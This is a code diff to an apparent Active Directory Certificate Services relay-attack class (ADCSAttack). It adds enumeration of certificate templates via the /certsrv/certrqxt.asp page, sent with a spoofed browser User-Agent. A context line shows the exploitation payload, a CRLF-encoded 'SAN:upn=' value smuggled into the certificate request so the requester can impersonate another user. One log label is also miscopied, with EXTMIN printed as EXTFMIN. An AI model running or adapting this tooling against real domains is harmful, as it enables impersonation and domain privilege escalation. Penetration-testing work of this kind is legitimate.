@@ -35,6 +35,29 @@ class ADCSAttack:
         if self.username in ELEVATED:
             LOG.info('Skipping user %s since attack was already performed' % self.username)
             return
+        
+        if self.config.enumTemplates:
+            templates = self.enum_templates()
+            # Print the parsed results
+            for entry in templates:
+                try:
+                    LOG.info(f'  - {entry["REALNAME"]}')
+                    LOG.debug(f'    - KEYSPEC: {entry["KEYSPEC"]}')
+                    LOG.debug(f'    - KEYFLAG: {entry["KEYFLAG"]}')
+                    LOG.debug(f'    - ENROLLFLAG: {entry["ENROLLFLAG"]}')
+                    LOG.debug(f'    - PRIVATEKEYFLAG: {entry["PRIVATEKEYFLAG"]}')
+                    LOG.debug(f'    - SUBJECTFLAG: {entry["SUBJECTFLAG"]}')
+                    LOG.debug(f'    - RASIGNATURE: {entry["RASIGNATURE"]}')
+                    LOG.debug(f'    - CSPLIST: {entry["CSPLIST"]}')
+                    LOG.debug(f'    - EXTOID: {entry["EXTOID"]}')
+                    LOG.debug(f'    - EXTMAJ: {entry["EXTMAJ"]}')
+                    LOG.debug(f'    - EXTFMIN: {entry["EXTFMIN"]}')
+                    LOG.debug(f'    - EXTFMIN: {entry["EXTMIN"]}')
+                    LOG.debug(f'    - FRIENDLYNAME: {entry["FRIENDLYNAME"]}')
+                except KeyError:
+                    LOG.info(f'  - {entry}')
+            LOG.info("Certificate enumeration complete!")
+            return
 
         current_template = self.config.template
         if current_template is None:
@@ -120,3 +143,49 @@ class ADCSAttack:
         if altName:
             return "CertificateTemplate:{}%0d%0aSAN:upn={}".format(template, altName)
         return "CertificateTemplate:{}".format(template)
+    
+    def enum_templates(self):
+        enum_headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Connection": "keep-alive"
+        }
+
+        # Key mapping for parsing
+        KEY_MAPPING = {
+            0: "OFFLINE",
+            1: "REALNAME",
+            2: "KEYSPEC",
+            3: "KEYFLAG",
+            4: "ENROLLFLAG",
+            5: "PRIVATEKEYFLAG",
+            6: "SUBJECTFLAG",
+            7: "RASIGNATURE",
+            8: "CSPLIST",
+            9: "EXTOID",
+            10: "EXTMAJ",
+            11: "EXTFMIN",
+            12: "EXTMIN",
+            13: "FRIENDLYNAME",
+        }
+
+        LOG.info("Enumerating certificates")
+        self.client.request("GET", "/certsrv/certrqxt.asp", headers=enum_headers)
+        response = self.client.getresponse()
+        content = response.read()
+        option_lines = re.findall(r"<Option Value.*?>", content.decode())
+
+        parsed_results = []
+        for line in option_lines:
+            # Extract the content after "<Option Value="
+            match = re.search(r"<Option Value=\"(.*?)\">", line)
+            if match:
+                raw_data = match.group(1)
+                # Split the data by semicolon
+                parsed_data = raw_data.split(";")
+                # Map the parsed data using the key mapping
+                parsed_dict = {KEY_MAPPING.get(i, f"UNKNOWN_{i}"): value for i, value in enumerate(parsed_data)}
+                parsed_results.append(parsed_dict)
+        return parsed_results
